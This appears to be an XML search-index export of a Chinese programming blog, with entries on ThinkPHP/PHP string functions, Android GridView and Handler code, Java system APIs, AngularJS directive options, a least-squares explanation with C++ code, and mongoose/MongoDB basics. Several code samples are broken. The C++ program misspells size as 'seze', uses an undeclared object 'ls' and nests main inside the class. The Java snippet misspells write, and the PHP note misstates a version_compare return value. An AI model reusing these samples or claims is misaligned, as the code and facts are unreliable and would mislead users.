    <content type="text"><![CDATA[ThinkPHP的目录结构Application目录分:Comman公众文件,Home应用主目录(网站主要目录,公众文件,配置文件,控制器文件,数据层文件,视图文件,部件文件),Runtime(包括缓存，临时数据，日志，临时文件)public目录分:Classes转换数据,js脚本文件,styles css文件,images图片文件,layer样式组件。ThinkPHP目录:框架目录。 version_compare1version_compare(PHP_VERSION,'5.4.0'); 如果大于5.4.0,则返回1等于返回0小于返回01version_compare(PHP_VERSION,'5.4.0','&gt;'); 如果大于5.4.0返回true否则返回false其他同理 or的用法1defined('CORE_PATH') or define('CORE_PATH','THINK'); 如果CORE_PATH已经定义了则返回true,那么在or逻辑运算中如果左侧的表达式是true则不会计算右侧的表达式 ini_set1ini_set('magic_quotes_runtime',0); ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 define和defineddefine(key,value)定义一个常量defined(key)是否定义了这个常量 strstr1strstr("I love Shanghai!","Shanghai"); 查找 “Shanghai” 在 “I love Shanghai!” 中的第一次出现，并返回字符串的剩余部分：返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。 strposstrpos() 函数用于检索字符串内指定的字符或文本。1echo strpos("Hello world!","world"); 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）]]></content>
      <categories>
        <category>PHP</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android开发总结(一)]]></title>
    <url>%2F2017%2F03%2F24%2Ffirst%2F</url>
    <content type="text"><![CDATA[更新UI开发遇到的问题:显示实时时间解决方法:123456789101112131415161718192021222324252627private Handler handleTime;private TextView third_text;third_text = (TextView)findViewById(R.id.third_text);handleTime = new Handler()&#123; public void handleMessage(android.os.Message msg) &#123; third_text.setText((String)msg.obj); &#125;; &#125;;Thread threadDate = new Thread(new Runnable() &#123; GetDateTime getDateTime; @Override public void run() &#123; // TODO Auto-generated method stub while(true)&#123; getDateTime = new GetDateTime(); time = getDateTime.dealDate(); handleTime.sendMessage(handleTime.obtainMessage(100,time)); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125; &#125;); threadDate.start(); 图表按钮之GridViewpictureModel.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class PictureModel &#123; private String title; private int imageID; /** * 默认构造函数 */ public PictureModel()&#123;&#125; /** * * @param 图像标注 * @param 图像ID */ public PictureModel(String title,int imageID)&#123; this.title = title; this.imageID = imageID; &#125; /** * * @return 返回图像标注 */ public String getTitle() &#123; return title; &#125; /** * * @param 设置图像标注 */ public void setTitle(String title) &#123; this.title = title; &#125; /** * * @return 返回图像ID */ public int getImageID() &#123; return imageID; &#125; /** * * @param 设置图像ID */ public void setImageID(int imageID) &#123; this.imageID = imageID; &#125; &#125; pictureAdapter.java类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class PictureAdapter extends BaseAdapter&#123; private LayoutInflater inflater; private List&lt;PictureModel&gt; pictures; public PictureAdapter(String[] titles,int[] imageIDs,Context context)&#123; super(); inflater = LayoutInflater.from(context); pictures = new ArrayList&lt;PictureModel&gt;(); for(int i = 0;i&lt;titles.length;i++)&#123; PictureModel picture = new PictureModel(titles[i],imageIDs[i]); pictures.add(picture); &#125; &#125; @Override public int getCount() &#123; // TODO Auto-generated method stub if(pictures!=null)&#123; return pictures.size(); &#125;else&#123; return 0; &#125; &#125; @Override public Object getItem(int position) &#123; // TODO Auto-generated method stub return pictures.get(position); &#125; @Override public long getItemId(int position) &#123; // TODO Auto-generated method stub return position; &#125; @Override public View getView(int position, View convertView, ViewGroup parent) &#123; class ViewHolder&#123; public TextView text; public ImageView image; &#125; ViewHolder viewHolder = new ViewHolder(); if(convertView == null)&#123; convertView = inflater.inflate(R.layout.picture_item, null); viewHolder.text = (TextView) convertView.findViewById(R.id.ItemTitle); viewHolder.image = (ImageView) convertView.findViewById(R.id.ItemImage); convertView.setTag(viewHolder); &#125;else&#123; viewHolder = (ViewHolder) convertView.getTag(); &#125; viewHolder.text.setText(pictures.get(position).getTitle()); viewHolder.image.setImageResource(pictures.get(position).getImageID()); return convertView; &#125;&#125; 实现类，把view填充到GridView中1234567891011String[] titles = new String[6]; int[] images = new int[6]; images[0] = R.drawable.icon0; images[1] = R.drawable.icon1; images[2] = R.drawable.icon2; images[3] = R.drawable.icon3; images[4] = R.drawable.icon4; images[5] = R.drawable.icon5; gvInfo = (GridView) findViewById(R.id.gv_Info); PictureAdapter adapter = new PictureAdapter(titles, images, this); gvInfo.setAdapter(adapter); 构建Activity123super.onCreate(savedInstanceState);//开始窗体的生命周期requestWindowFeature(Window.FEATURE_NO_TITLE);//设置参数setContentView(R.layout.activity_main);//设置View 总结(1) 做了一天，进去看了很多源码，最终看到的是Context，View，Adapter。就这三个，说一下目前的了解，Context在我看来就是像浏览器引擎的上下文context，可以通过它做很多东西。而View大多是一个view组件，像xml文件里面的组成都是view。而adapter则可以做一个view然后填充到另一个view。或许三者合在一起就有了一个这么个窗体。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读Java源代码总结一]]></title>
    <url>%2F2017%2F03%2F19%2Ffirst%2F</url>
    <content type="text"><![CDATA[文件类使用做日志文件12345678910111213File log = new File(System.getProperty("user.dir"),"liuzhihao.log") //System.getProperty("user.dir")获取当前用户目录try&#123;if(!log.exists())&#123; log.createNewFile();&#125;else&#123;&#125;&#125;catch(IOException e)&#123; System.out.print(e);&#125;FileWriter wri = null;wri = new FileWriter(log,true);//需捕获IO异常wri.wirte(new Date()+"已经开始了"+System.getProperties().getProperty("line.separator"))//用系统的换行wri.flush()//正式写入 获取系统配置1234Properties pp = System.getProperties();System.out.println(pp.getProperty("os.name));//获取系统名称System.out.println(pp.getProperty("os.version"));//获取系统版本System.out.println(pp.getProperty("os.arch"));//获取处理机位数 shell命令执行12345678Runtime prt = Runtime.getRuntime();String order[] &#123;"notepad.exe","liuzhihao.log"&#125;;try&#123; prt.exec(order);&#125;catch(IOException e)&#123; e.printStackTrace();&#125;//用记事本打开liuzhihao.log 获取系统显示器高宽123Toolkit gTool = Toolkit.getDefaultToolkit();Dimension pDem = gTool.getScreenSize();System.out.println("屏幕的高:"+pDem.getHeight()+"\n屏幕的宽:"+pDem.getWidth()); 调用系统浏览器12Desktop.getDesktop().browse(new URI("http://www.baidu.com"));//捕获IO异常和URI异常 配置文件properties使用使用properties类来实现，该类是继承HashTable的子类，因此Map结合的基本使用方法它都有，但是我们需要的是下面的:1、getProperty(String key),用指定的键在此属性列表中搜索属性。也就是通过参数key得到key所对应的value。2、public void load(Reader reader),从输入流中读取属性列表(键和元素对)。通过对指定文件进行装载来获取该文件中的所有键值对。以提供getProperty(String key)搜索。3、setProperty(String key,String value),调用HashTable的方法put。只不过是将put(k KEY,V value)通过显式的指定为String类型保证了只可以接受String类型的参数，在实际开发时，我们也经常需要使用这种方法，来包装一个父类的方法。4、public void store(Writer writer,String comments)与load方法相反，该方法将键值对写入到指定的文件中去。5、public Set stringPropertyNames()返回此属性列表中的键集，其中该键及其对应值是字符串，主要是用于遍历。 获取年月日Calendar类12345678910111213public static String getTiem()&#123; Calendar cal = Calendar.getInstance(); int year = cal.get(Calendar.YEAR); int month = cal.get(Calendar.MONTH)+1; int day = cal.get(Calendar.DAY_OF_MONTH); int hour = cal.get(Calendar.HOUR_OF_DAY); int minute = cal.get(Calendar.MINUTE); int second = cal.get(Calendar.SECOND); int week = cal.get(Calendar.DAY_OF_WEEK); String dateTime=""; dateTime=dateTime+year+"/"+month+"/"+day+" "+hour+":"+minute+":"+second+" "+week; return dateTime; &#125; 获得的月份要加1。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之指令深入版]]></title>
    <url>%2F2017%2F03%2F13%2Ffirst%2F</url>
    <content type="text"><![CDATA[指令简介对于指令，可以把它简单的理解成在特定DOM元素上运行的函数，指令可以扩展这个元素的功能。例如,ng-click可以让一个元素能够监听click事件，并在接收到事件的时候执行angularjs表达式。正是指令使得angularjs这个框架变得强大，并且正如所见，我们可以自己创造新的指令。angularjs应用的模块中有很多方法可以使用，其中directive()这个方法是用来定义指令的: 1234angular.module('myApp',[]).directive('myDirective',function($timeout,userDefinedService)&#123; //指令放在这里&#125;); 1、name(字符串)指令的名字，用来在视图中引用特定的指令。2、factory_function(函数)这个函数返回一个对象，其中定义了指令的全部行为。$compile服务利用这个方法返回的对象，在DOM调用指令时来构造指令的行为。 1234567angular.module('myApp',[]).directive('myDirective',function()&#123; //一个指令定义对象 return &#123; //通过设置项来定义指令，在这里进行重写 &#125;;&#125;); 我们也可以返回一个函数代替对象来定义指令，但是像上面的例子一样，通过对象来定义是最佳的方式。当返回一个函数时，这个函数通常被称作链接传递函数，利用它我们可以定义指令的链接功能。当angularjs启动应用时，它会把第一个参数当做一个字符串，并以此字符串为名来注册第二个参数返回的对象。angularjs编译器会解析HTML的DOM中的元素、属性、注释和CSS类名中使用了这个名字的地方，并在这些地方引用对应的指令。当它找到某个已知的指令时，就会在页面中插入指令所对应的DOM元素。指令的工厂函数只会在编译器第一次匹配到这个指令时调用一次。和controller函数类似，我们通过\$injector.invoke来调用指令的工厂函数。当angularjs在DOM中遇到具名的指令时，会去匹配已经注册过的指令，并通过名字在注册过的对象中查找。此时，就开始了一个指令的生命周期，指令的生命周期开始于$compile方法并结束于link方法。 指令全部设置全部配置选项如下: 12345678910111213141516171819202122232425angular.module('myApp',[]).directive('myDirective',function()&#123; return&#123; restrict:String, priority:Number, terminal:Boolean, template:String or Template Function: function(tElement,tAttrs)&#123;...&#125;, templateUrl:String, replace:Boolean or String, scope:Boolean or String, transclude:String or function(scope,element,attrs,transclude,otherInjectables)&#123;...&#125;, controllers:String, require:String, link:function(scope,iElement,iAttrs)&#123;...&#125;, compile: function(tElement,tAttrs,transclude)&#123; return&#123; pre:function(scope,iElement,iAttrs,controller)&#123;...&#125;,post:function(scope,iElement,iAttrs,controller)&#123;...&#125; &#125;return function postLink(...)&#123;...&#125; &#125;&#125;;&#125;); restrict(字符串配置)restrict是一个可选的参数。它告诉angularjs这个指令在DOM中可以何种形式被声明。默认angularjs认为restrict的值是A，即以属性的形式来进行声明。可选值如下:E(元素) A(属性，默认值) C(类名) M(注释)&lt;–directive:my-directive expression–&gt;这些选项可以单独使用，也可以混合在一起使用: 12345angular.module('myDirective',function()&#123; return &#123; restrict:'EA' //输入元素或属性&#125;;&#125;); 属性是用来声明指令最常用的方式，因为它能在包括老版本的IE浏览器在内的所有浏览器中正常工作，并且不需要在文档头部注册新的标签。元素方式还是属性方式在页面中通过元素方式创建新的指令可以将一些功能封装在元素内部。例如，如果我们想要做一个时钟，可以创建一个clock指令，然后在DOM中用如下代码来声明: 这样做可以告诉指令的使用者，这里会完整包含应用的某一些内容。这个时钟并不是对一个既有时钟的修饰或扩展，而是一个全新的单元。尽管这里也可以使用属性形式声明指令，但我们选择了元素形式，因为这样可以更明确地表达意图。用属性形式来给一个已经存在的元素添加数据或行为。以时钟为例，假设我们更喜欢模拟时钟: 如何进行选择，通常取决于定义的指令是否包含某个组件的核心行为，或者用额外的行为、状态或者其他内容对某个核心组件进行修饰或扩展。另外一个重要的标准，是根据指令是否创建、继承或将自己从所属的环境中隔离出去进行判断。指令的父子关系对其组成和重用性起着至关重要的作用，会有额外的内容来更加深入地讨论指令的作用域。 priority优先级(数字)优先级参数可以被设置为一个数值。大多数指令会忽略这个参数，使用默认值0，但也有些场景设置高优先级是非常重要甚至是必须的。例如,ngRepeat将这个参数设置为1000，这样就可以保证在同一元素上，它总是在其他指令之前被调用。注意:ngRepeat是所有内置指令中优先级最高的，它总是在其他指令之前运行。这样设置主要考虑的是性能。 terminal(布尔型)terminal是一个布尔型参数，可以被设置为true或false。这个参数用来告诉angularjs停止运行当前元素上比本指令优先级低的指令。但同当前指令优先级相同的指令还是会被执行。使用了terminal参数的例子是ngView和ngIf。ngIf的优先级略高于ngView,如果ngIf的表达式值为true,ngView就可以被正常执行，但如果ngIf表达式的值为false,由于ngView的优先级较低就不会被执行。 template(字符串或函数)template参数是可选的，必须被设置为以下两种形式之一:一段HTML文本。一个可以接受两个参数的函数，参数为tElement和tAttrs,并返回一个代表模板的字符串。tElement和tAttrs中的t代表template,是相对于instance。在讨论链接和编译设置时会详细介绍，模板元素或属性与实例元素或属性之间的区别。angularjs会同处理HTML一样处理模板字符串。模板中可以通过大括号来访问作用域，例如。如果模板字符串中含有多个DOM元素，或者只由一个单独的文本节点构成，那它必须被包含在一个父元素内。换句话说，必须存在一个根DOM元素: 12345template: '\ &lt;div&gt;&lt;-- single root element --&gt;\ &lt;a href="http://www.baidu.com"&gt;Click me&lt;/a&gt;\ &lt;h1&gt;when using two elements,wrap them in a parent element&lt;/h1&gt;\ &lt;/div&gt;\' 另外，注意每一行末尾的反斜线，这样angularjs才能正确解析多行字符串。在实际生产中，更好的选择是使用templateUrl参数引用外部模板。模板字符串和templateURL中最需要了解的重要功能，是它们如何同作用域链接起来。 templateUrl(字符串或函数)templateUrl是可选的参数，可以是以下类型:一个代表外部HTML文件路径的字符串一个可以接受两个参数的函数，参数为tElement和tAttrs,并返回一个外部HTML文件路径的字符串。无论哪种方式，模板的URL都将通过AngularJS内置的安全层，特别是$getTrustedResourceUrl,这样可以保护模板不会被不信任的源加载。默认情况下，调用指令时会在后台通过ajax来请求HTML模板文件。有两件事需要知道。在本地开发时，需要在后台运行一个本地服务器，用以从文件系统加载HTML模板，否则会导致Cross Origin Request script(CORS)错误.模板加载时异步的，意味着编译和链接要暂停，等待模板加载完成。通过Ajax异步加载大量的模板将严重拖慢一个客户端应用的速度。为了避免延迟，可以在部署应用之间对HTML模板进行缓存。在大多数场景下缓存都是一个非常好的选择，因为angularjs通过减少请求数量提升了性能。模板加载后，angularjs会将它默认缓存到$templateCache服务中。在实际生产中，可以提前将模板缓存到一个定义模板的javascript文件中，这样就不需要通过XHR来加载模板了。 replace(布尔型)replace是一个可选参数，如果设置了这个参数，值必须为true，因为默认值为false。默认值意味着模板会被当做子元素插入到调用此指令的元素内部: 123456&lt;div some-directive&gt;&lt;/div&gt;.directive('someDirective',function()&#123; return&#123; template:'&lt;div&gt;some stuff here&lt;/div&gt;'&#125;;&#125;); 调用指令之后的结果如下(这是默认replace为false时的情况): 123&lt;div some-directive&gt;&lt;div&gt;some stuff here&lt;/div&gt;&lt;/div&gt; 如果replace被设置为了true: 123456.directive('someDirective',function()&#123; return &#123; replace:true,//修饰过 template:'&lt;div&gt;some stuff here&lt;/div&gt;'&#125;;&#125;); 指令调用后的结果 1&lt;div&gt;some stuff here&lt;/div&gt; 指令作用域为了完全理解指令定义对象中剩下的参数，需要先介绍指令作用域是如何工作的。$rootScope这个特殊的对象会在DOM中声明ng-app时被创建: 12345&lt;div ng-app="myApp" ng-init="someProperty='some data'"&gt;&lt;/div&gt;&lt;div ng-init="siblingProperty='more data'"&gt; Inside Div Two &lt;div ng-init="aThirdProperty"&gt;&lt;/div&gt;&lt;/div&gt; 上面的代码中，我们在应用的根作用域中设置了三个属性:someProperty、siblingProperty和anotherSiblingProperty。从这里开始，DOM中每个指令调用时都可能会:直接调用相同的作用域对象。从当前作用域对象继承一个新的作用域对象。创建一个同当前作用域想隔离的作用域对象。上面的例子展示的是第一种情况。前两个div是兄弟元素，可以通过get和set访问$rootScope。第二个div内部的div同样可以通过get和set访问相同的根作用域。指令嵌套并不一定意味着需要改变它的作用域。默认情况下，子指令会被付予访问父DOM元素对应的作用域的能力，这样做的原因可以通过介绍指令的scope参数来理解，scope参数默认是false。 scope参数(布尔型或对象)scope参数是可选的，可以被设置为true或一个对象。默认值是false。当scope设置为true时，会从父作用域继承并创建一个新的作用域对象。如果一个元素上有多个指令使用了隔离作用域，其中只有一个可以生效。只有指令模板中的根元素可以获得一个新的作用域。因此，对于这些对象来说scope默认被设置为true。内置指令ng-controller的作用，就是从父级作用域继承并创建一个新的子作用域。它会创建一个新的从父作用域继承而来的子作用域。用这些新内容更新一下前面的例子: 1234567891011&lt;div ng-app="myApp" ng-init="someProperty='some data'"&gt; &lt;div ng-init="siblingProperty='moredata'"&gt; Inside Div Two:&#123;&#123;aThirdProperty&#125;&#125; &lt;div ng-init="aThirdProperty='data for 3rd property'" ng-controller="someController"&gt; Inside Div Three :&#123;&#123;aThirdProperty&#125;&#125; &lt;div ng-init="aFourthProperty"&gt; Inside Div Four:&#123;&#123;aThirdProperty&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 如果直接运行代码会报错，因为没有javascript中定义所需的控制器，下面就来定义这个控制器: 1234angular.module('myApp',[]).controller('SomeController',function($scope)&#123; //可以留空，但需要被定义&#125;); 刷新页面，会发现第二个div中由于未定义，因此什么都没有输出。第三个div显示了设置在继承来的作用有中的data for a 3rd property。为了进一步证明作用域的继承机制是向下而非向上进行的，下面再看另外一个例子，展示的是从父作用域继承而来: 12345678910&lt;div ng-app="myApp" ng-init="someProperty='some data'"&gt;&lt;/div&gt;&lt;div ng-init="siblingProperty='moredata'"&gt; Inside Div Two:&#123;&#123;aThirdProperty&#125;&#125; &lt;div ng-init="aThirdProperty='data for 3rd property'" ng-controller="SomeController"&gt; Inside Div Three:&#123;&#123;aThirdProperty&#125;&#125; &lt;div ng-controller="SecondController"&gt; Inside Div Four:&#123;&#123;aThirdProperty&#125;&#125; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 输出123Inside Div:Two;Inside Div Three:data for 3rd propertyInside Div Four:data for 3rd property 在javascript中加入SecondController的定义: 1234567angular.module('myApp',[]).controller('SomeController',function($scope)&#123; //可以留空，但需要被定义&#125;).controller('SecondController',function($scope)&#123; //同样可以留空&#125;) 如果要创建一个能够从外部原型继承作用域的指令，将scope属性设置为true: 1234567angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'A', scope:true&#125;;&#125;); 下面用指令来改变DOM的作用域:123456789101112131415&lt;div ng-app="myApp" ng-init="someProperty='some data'"&gt;&lt;/div&gt;&lt;div ng-init="siblingProperty='moredata'"&gt;Inside Div Two:&#123;&#123;aThirdProperty&#125;&#125;&lt;div ng-init="aThirdProperty='data for 3rd property'" ng-controller="SomeController" &gt; Inside Div Three:&#123;&#123;aThirdProperty&#125;&#125; &lt;div ng-controller="SecondController"&gt; Inside Div Four:&#123;&#123;aThirdProperty&#125;&#125; &lt;br/&gt; Outside myDirective:&#123;&#123;myProperty&#125;&#125; &lt;div my-directive ng-init="myProperty='wow,this is cool'"&gt; Inside myDirective:&#123;&#123;myProperty&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最小二乘法]]></title>
    <url>%2F2017%2F03%2F12%2Ffirst%2F</url>
    <content type="text"><![CDATA[简介我们以最简单的一元线性模型来解释最小二乘法。什么是一元线性模型呢？监督学习中，如果预测的变量是离散的，我们称其为分类（如决策树，支持向量机等），如果预测的变量是连续的，我们称其为回归。回归分析中，如果只包括一个自变量和一个因变量，且二者的关系可用一条直线近似表示，这种回归分析称为一元线性回归分析。如果回归分析中包括两个或两个以上的自变量，且因变量和自变量之间是线性关系，则称为多元线性回归分析。对于二维空间线性是一条直线；对于三维空间线性是一个平面，对于多维空间线性是一个超平面… 最小二乘法分析 对于一元线性回归模型, 假设从总体中获取了n组观察值（X1，Y1），（X2，Y2）， …，（Xn，Yn）。对于平面中的这n个点，可以使用无数条曲线来拟合。要求样本回归函数尽可能好地拟合这组值。综合起来看，这条直线处于样本数据的中心位置最合理。 选择最佳拟合曲线的标准可以确定为：使总的拟合误差（即总残差）达到最小。有以下三个标准可以选择：(1)用”残差和最小”确定直线位置是一个途径。但很快发现计算”残差和”存在相互抵消的问题。(2)用”残差绝对值和最小”确定直线位置也是一个途径。但绝对值的计算比较麻烦。(3)最小二乘法的原则是以”残差平方和最小”确定直线位置。用最小二乘法除了计算比较方便外，得到的估计量还具有优良特性。这种方法对异常值非常敏感。最常用的是普通的最小二乘法:所选择的回归模型应该使所有观察值的残差平方和达到最小。即采用平方损失函数。样本回归模型:其中ei为样本(Xi,Yi)的误差平方损失函数:则通过Q最小确定这条直线，即确定贝塔0，贝塔1，以贝塔0，贝塔1为变量，把它们看作是Q的函数，就变成了一个求极值的问题，可以通过求导数得到。求Q对两个待估参数的偏导数:根据数学知识我们知道，函数的极值点为偏导为0的点。解得:这就是最小二乘法的解法，就是求得平方损失函数的极值点。 实现代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/*最小二乘法C++实现参数1为输入文件输入:x输出:预测的y*/#include&lt;iostream&gt;#include&lt;fstream&gt;#include&lt;vector&gt;using namespace std;class LeastSquare &#123; double a,b;public: LeastSquare(const vector&lt;double&gt;&amp; x,const vector&lt;double&gt;&amp; y) &#123; double t1=0,t2=0,t3=0,t4=0; for(int i=0;i&lt;x.seze();++i)&#123; t1+=x[i]*x[i]; t2+=x[i]; t3+=x[i]*y[i]; t4+=y[i];&#125; a=(t3*x.size()-t2*t4)/(t1*x.size()-t2*t2);//求得贝塔1 b=(t1*t4-t2*t3)/(t1*x.size()-t2*t2);//求得贝塔2&#125; double getY(const double x) const &#123; return a*x+b;&#125; void print() const &#123; cout&lt;&lt;"y="&lt;&lt;a&lt;&lt;"x+"&lt;&lt;b&lt;&lt;"\n";&#125; int main(int argc,char *argv[])&#123; if(argc!=2)&#123; cout&lt;&lt;"Usage:DataFile.txt"&lt;&lt;endl; return -1;&#125; else &#123; vector&lt;double&gt; x; ifstream in (argv[1]); for(double d;in&gt;&gt;d;) x.push_back(d); int sz = x.size(); vector&lt;double&gt; y(x.begin()+sz/2,x.end()); x.resize(sz/2); LeastSquare(x,y); ls.print(); cout&lt;&lt;"Input x:\n"; double x0; while(cin&gt;&gt;x0) &#123; cout&lt;&lt;"y="&lt;&lt;ls.getY(x0)&lt;&lt;endl; cout&lt;&lt;"Input x:\n"; &#125; &#125;&#125;&#125; 最小二乘法与梯度下降法 最小二乘法跟梯度下降法都是通过求导来求损失函数的最小值，那它们有什么区别呢。相同1.本质相同：两种方法都是在给定已知数据（independent &amp; dependent variables）的前提下对dependent variables算出出一个一般性的估值函数。然后对给定新数据的dependent variables进行估算。 2.目标相同：都是在已知数据的框架内，使得估算值与实际值的总平方差尽量更小（事实上未必一定要使用平方），估算值与实际值的总平方差的公式为：其中\bar{x_{i} } 为第i组数据的independent variable，y_{i} 为第i组数据的dependent variable，\beta 为系数向量。 不同 1.实现方法和结果不同：最小二乘法是直接对\Delta求导找出全局最小，是非迭代法。而梯度下降法是一种迭代法，先给定一个\beta ，然后向\Delta下降最快的方向调整\beta ，在若干次迭代之后找到局部最小。梯度下降法的缺点是到最小点的时候收敛速度变慢，并且对初始点的选择极为敏感，其改进大多是在这两方面下功夫。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[express之mongoose操作]]></title>
    <url>%2F2017%2F03%2F12%2Fthird%2F</url>
    <content type="text"><![CDATA[mongoose简介在说MongoDB数据插入操作之前，我们先来简单了解下它的数据逻辑结构。MongoDB的逻辑结构是一种层次结构，主要由：文档(document)、集合(collection)、数据库(database)这三部分组成的。文档(document)：由键/值对构成，像{a:1}；{s:”abc”}等，它是MongoDB核心单元，MongoDB的文档（document），相当于关系数据库中的一行记录。集合（Collection）：多个文档组成一个集合（collection），相当于关系数据库的表。数据库（database）：多个集合（collection），逻辑上组织在一起，就是数据库（database）。一个MongoDB实例支持多个数据库（database）。 使用mongoose安装mongoose 1npm install mongoose 引用mongoose 1var mongoose = require("mongoose"); 使用mongoose链接数据库 1var db = mongoose("mongodb://user:pass@localhost:port/database"); 示例:12345678var mongoose = require(“mongoose”); var db = mongoose.connect(“mongodb://127.0.0.1:27017/test”); db.connection.on(“error”, function (error) &#123; console.log(“数据库连接失败：” + error); &#125;); db.connection.on(“open”, function () &#123; console.log(“——数据库连接成功！——”); &#125;); mongodb基础Schema ： 一种以文件形式存储的数据库模型骨架，不具备数据库的操作能力Model ： 由Schema发布生成的模型，具有抽象属性和行为的数据库操作对Entity ： 由Model创建的实体，他的操作也会影响数据库Schema —— 一种以文件形式存储的数据库模型骨架，无法直接通往数据库端，也就是说它不具备对数据库的操作能力，仅仅只是数据库模型在程序片段中的一种表现，可以说是数据属性模型(传统意义的表结构)，又或着是“集合”的模型骨架。定义 1234567var mongoose = require("mongoose")var TestSchema = new mongoose.Schema(&#123; name : &#123;type:String&#125;, age : &#123;type:Number,default:0&#125;, time : &#123;type:Date,default:Date.now&#125;, emial : &#123;type:String,default:''&#125;&#125;); 基本属性类型有：字符串、日期型、数值型、布尔型(Boolean)、null、数组、内嵌文档等 Model —— 由Schema构造生成的模型，除了Schema定义的数据库骨架以外，还具有数据库操作的行为，类似于管理数据库属性、行为的类。 123var db = mongoose.connect("mongodb://127.0.0.1:27017/test");// 通过Schema创建Modelvar TestModel = db.model("test1", TestSchema); 数据库中的集合名称,当我们对其添加数据时如果test1已经存在，则会保存到其目录下，如果未存在，则会创建test1集合，然后在保存数据。 Entity —— 由Model创建的实体，使用save方法保存数据，Model和Entity都有能影响数据库的操作，但Model比Entity更具操作性。 1234567var TestEntity = new TestModel(&#123; name : "Lenka", age : 36, email : "lenka@qq.com"&#125;);console.log(TestEntity.name); // Lenkaconsole.log(TestEntity.age); // 36 mongoose-mongodb1、定义模式(Schema)每个模式映射mongoDB的一个集合（注意映射这个词，下面会讲为什么），它定义（只是定义，不是实现）这个集合里面文档的结构，就是定义这个文档有什么字段，字段类型是什么，字段默认值是什么等。除了定义结构外，还定义文档的实例方法，静态模型方法，复合索引，中间件等。 123456789101112131415var mongoose = require('mongoose');var Schema = mongoose.Schema;/*定义模式Student_Schema*/var Student_Schema = new Schema(&#123; name: String, id: Number, phone: String, date: Date&#125;, &#123; versionKey: false&#125;);/*定义模型Student，注意数据库存的是students*/mongoose.model("Student", Student_Schema); {versionKey: false}是干嘛用？如果不加这个设置，我们通过mongoose第一次创建某个集合时，它会给这个集合设定一个versionKey属性值，这个属性值包含这个文档的内部版本，数据库中显示为_v，如图：通过{versionKey: false}可以配置这个参数，让数据库不再添加这个属性，格式是：new Schema({..}, { versionKey: false });2、定义模型(Model)模型用来实现我们定义的模式，调用mongoose.model来编译Schema得到Model。 12/*定义模型Student，数据库存的是students*/mongoose.model("Student", Student_Schema); 为什么上面我强调模式的映射，那是因为模式仅仅是和db中集合文档的结构相对应（映射），它并不直接在数据库中操作这个结构，模型才是直接与数据库打交道的存在，可以这么说：模式是定义结构，模型是实现操作。当我们使用mongoose.model(“Student”, Student_Schema)创建Student模型对数据进行操作时，数据库会寻找一个名字叫students集合接受Student模型的操作，特别需要注意的是：1.如果是增加（instance.save）操作时，数据库中没有这个集合，数据库会自动创建这个集合存储数据，这个集合产生规则为：把Model名字字母全部变小写和在后面加复数s。2.如果是删改查三个操作数据库中没有这个集合，那就是没有，删除空修改空返回空。 3、访问模型 1var MyStudent = mongoose.model("Student"); 到这里，已经基本完成了使用mongoose前提操作了。有没有觉得有点繁琐，其实我也觉得挺繁琐，幸运的是234可以一步创建： 123456var MyStudent = mongoose.model('Student',&#123; name: String, id: Number, phone: String, date: Date&#125;); 4、创建实例(instance) 123456var sam = new MyStudent(&#123; name: "sam976", id: 123, phone: "18706888888", date: Date.now()&#125;); 一般只在save（增加）操作中需要。 模型的实例是集合中真实的数据，就是collection中的document，用mysql中的术语来说就是一条记录。模型在数据库中建好了集合和文档结构后，通过实例往里面添加真实的document。捋一捋模式、模型、实例的关系：模式定义了操作和属性，这些操作和属性包括mongoose自带和自定义，而模型和实例可以对模式里面定义的属性和方法进行引用。模型是mongoose用来和数据库直接打交道的中介，实例是往数据库存的真实数据。模式并非必须，那为什么要分开模式和模型呢？我觉得是遵循了软件设计中“定义和实现分开”这个原则。有的文章说模式没有操作数据库的能力，模型才有，对这个观点，我觉得部分对，虽说模式不能直接操作数据库，但模式定义的方法可以被模型用来操作数据库。官方文档是这么说的： model.findMongoose 模型提供了 find, findOne, 和 findById 方法用于文档查询。Model.find(query, fields, options, callback)// fields 和 options 都是可选参数简单查询 1Model.find(&#123; 'csser.com': 5 &#125;, function (err, docs) &#123; // docs 是查询的结果数组 &#125;); 只查询指定键的结果 123Model.find(&#123;&#125;, ['first', 'last'], function (err, docs) &#123; // docs 此时只包含文档的部分键值&#125;) Model.findOne与 Model.find 相同，但只返回单个文档 123Model.findOne(&#123; age: 5&#125;, function (err, doc)&#123; // doc 是单个文档&#125;); Model.findById与 findOne 相同，但它接收文档的 _id 作为参数，返回单个文档。_id 可以是字符串或 ObjectId 对象。 123Model.findById(obj._id, function (err, doc)&#123; // doc 是单个文档&#125;); Model.count返回符合条件的文档数 1Model.count(conditions,callback) Model.remove删除符合的条件的文档 1Model.remove(conditions,callback); Model.distinct查询符合条件的文档并返回根据键分组的结果.Model.distinct(field,conditions,callback); Model.where当查询比较复杂时，用where: 12345678910Model.where('age').gte(25).where('tags').in(['movie', 'music', 